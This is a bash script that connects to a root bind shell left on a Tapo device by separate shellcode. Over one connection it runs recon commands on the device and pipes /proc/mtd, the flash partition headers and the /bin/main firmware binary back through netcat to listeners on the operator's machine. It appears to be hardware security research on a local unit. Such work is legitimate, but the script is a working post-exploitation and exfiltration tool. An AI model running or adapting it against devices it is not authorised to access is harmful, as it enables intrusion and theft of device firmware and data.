#!/bin/bash
# Harvest a Tapo bind shell the moment it appears.
#
# The shell is one-shot by construction: tapo_bind4444.S does socket/bind/listen(1)/accept/dup2/
# execve("/bin/sh") and then *becomes* the shell, so the port dies with the connection. Everything
# therefore has to travel in ONE connection, cheapest evidence first, the binary last.
#
# Nothing on the device is written except /tmp/h.log (tmpfs). Only cat/dd/ls/id/uname are used.
#
#   ./tapo_root_harvest.sh [HOST]                 # default 192.168.4.33
#   FORCE=1 ./tapo_root_harvest.sh                # skip the presence gate
#
# Exit: 0 harvested · 2 unit absent · 3 no shell on :4444 · 4 a receiver could not bind
set -u
HOST="${1:-${HOST:-192.168.4.33}}"
MAC="${MAC:-50:3d:d1:e3:e2:07}"
SHELL_PORT="${SHELL_PORT:-4444}"
HOSTIP="${HOSTIP:-192.168.4.160}"
P_MAIN="${P_MAIN:-8444}"
P_MTD="${P_MTD:-8445}"
P_RECON="${P_RECON:-8446}"
WINDOW="${WINDOW:-20}"          # client-side hard stop; the operator window is ~15 s
OUTDIR="${OUTDIR:-/tmp/pane2/$HOST}"

log() { printf '%s %s\n' "$(date +%H:%M:%S)" "$*"; }
die() { log "STOP: $*"; exit "${2:-1}"; }

# --- guard: never poke an absent unit ---------------------------------------------------------
# arp prints octets without leading zeros (…:e2:7), so both sides are normalised before matching
norm_mac() { echo "$1" | tr A-F a-f | awk -F: '{ for (i = 1; i <= NF; i++) $i = $i + 0; print }' OFS=:; }
in_arp() {
  sudo -n /usr/sbin/arp -an 2>/dev/null | awk -v ip="$HOST" -v m="$(norm_mac "$MAC")" '
    { gsub(/[()]/, "", $2); if ($2 != ip) next
      n = split($4, o, ":"); out = ""
      for (i = 1; i <= n; i++) out = out (i > 1 ? ":" : "") (o[i] + 0)
      if (out == m) { found = 1 } }
    END { exit !found }'
}
if [ "${FORCE:-0}" != 1 ]; then
  in_arp || die "$HOST is not in ARP (absent) — nothing sent" 2
  ping -c 2 -W 700 "$HOST" >/dev/null 2>&1 || die "$HOST has no ICMP (asleep/wedged) — nothing sent" 2
fi
# No `nc -z` probe: the shellcode accepts exactly once, so a probe would consume the shell and the
# port would be gone before the real connection. The harvest connection is the probe.
mkdir -p "$OUTDIR"
log "harvesting $HOST -> $OUTDIR (window ${WINDOW}s)"

# --- receivers first: a stream that arrives before its listener is lost ------------------------
pids=()
recv() { # port name
  : > "$OUTDIR/$2.part"
  nc -l "$1" > "$OUTDIR/$2.part" 2>/dev/null &
  pids+=($!)
}
cleanup() { for p in "${pids[@]:-}"; do kill "$p" 2>/dev/null; done; }
trap cleanup EXIT
recv "$P_RECON" recon.txt
recv "$P_MTD" mtd_heads.txt
recv "$P_MAIN" main.bin
for port in "$P_RECON" "$P_MTD" "$P_MAIN"; do
  for _ in 1 2 3 4 5 6 7 8 9 10; do
    sudo -n lsof -nP -iTCP:"$port" -sTCP:LISTEN >/dev/null 2>&1 && break
    sleep 0.2
  done
  sudo -n lsof -nP -iTCP:"$port" -sTCP:LISTEN >/dev/null 2>&1 || die "receiver $port never bound" 4
done

# --- the one connection ----------------------------------------------------------------------
# A quoted heredoc, so nothing is expanded here: the device shell must see `$1` and `$d` literally.
# mtd heads are hex so the whole set is one text stream with clean markers (binary framing across
# a shell pipe is not worth it at 4 KiB per block).
cat > "$OUTDIR/script.sh" <<'EOS'
id > /tmp/h.log; id
uname -a; cat /proc/cmdline
echo "### recon"; cat /proc/mtd; ls -l /bin/main /lib/libc.so.0 2>&1; df -h / /tmp 2>&1
cat /proc/mtd | nc @HOSTIP@ @P_RECON@
for d in $(awk 'NR>1{print $1}' /proc/mtd); do
  echo "### $d"; dd if=/dev/$d bs=4096 count=1 2>/dev/null | od -An -tx1
done | nc @HOSTIP@ @P_MTD@
cat /bin/main | nc @HOSTIP@ @P_MAIN@
echo HARVEST-DONE
EOS
# perl, not `sed -i ''`: this BSD sed reads the empty backup suffix as a file name
perl -pi -e "s|\@HOSTIP\@|$HOSTIP|g; s|\@P_RECON\@|$P_RECON|g; s|\@P_MTD\@|$P_MTD|g; s|\@P_MAIN\@|$P_MAIN|g" \
  "$OUTDIR/script.sh"

nc -w "$WINDOW" "$HOST" "$SHELL_PORT" < "$OUTDIR/script.sh" > "$OUTDIR/shell.out" 2>&1
rc=$?
if [ "$rc" -ne 0 ] && [ ! -s "$OUTDIR/shell.out" ]; then
  cleanup; trap - EXIT
  die "no shell on $HOST:$SHELL_PORT (connect failed)" 3
fi
log "connection closed (nc rc=$rc)"

# --- settle, then judge ----------------------------------------------------------------------
sleep 1
cleanup
trap - EXIT
for f in recon.txt mtd_heads.txt main.bin; do
  [ -e "$OUTDIR/$f.part" ] && mv "$OUTDIR/$f.part" "$OUTDIR/$f"
done

ok=1
size() { [ -e "$1" ] && wc -c < "$1" | tr -d ' ' || echo 0; }
for f in recon.txt mtd_heads.txt main.bin; do
  n=$(size "$OUTDIR/$f")
  if [ "$n" -gt 0 ]; then log "got $f ($n B)"; else log "EMPTY $f"; ok=0; fi
done
if grep -q '^uid=0' "$OUTDIR/shell.out" 2>/dev/null; then log "uid=0 confirmed"; else log "WARN: no uid=0 in shell output"; fi
if grep -q HARVEST-DONE "$OUTDIR/shell.out" 2>/dev/null; then log "script ran to completion"; else log "WARN: script did not reach HARVEST-DONE"; fi
[ -s "$OUTDIR/main.bin" ] && shasum -a 256 "$OUTDIR/main.bin" | tee "$OUTDIR/manifest.txt"
log "artifacts in $OUTDIR"
[ "$ok" = 1 ] || exit 1
